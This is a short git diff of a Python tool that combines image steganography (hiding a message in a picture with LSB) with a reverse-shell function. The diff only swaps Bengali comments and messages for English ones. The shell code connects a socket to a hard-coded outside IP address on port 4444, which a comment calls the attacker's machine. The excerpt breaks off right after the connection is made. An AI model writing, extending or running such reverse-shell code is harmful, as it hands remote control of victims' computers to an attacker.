@@ -9,12 +9,12 @@ from tkinter import filedialog, messagebox
 def hide_data(image_path, secret_message, output_image):
     secret_img = lsb.hide(image_path, secret_message)
     secret_img.save(output_image)
-    print(f"ফাইল সফলভাবে লুকানো হয়েছে: {output_image}")
+    print(f" Successfull: {output_image}")
 
 # Reverse Shell Function: Connect to Attacker's Machine
 def reverse_shell():
-    server_ip = "45.117.63.61"  # আপনার আক্রমণকারী সিস্টেমের IP অ্যাড্রেস
-    server_port = 4444  # আপনার পছন্দের পোর্ট নম্বর
+    server_ip = "45.117.63.61"  # ip
+    server_port = 4444  # port
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server_ip, server_port))
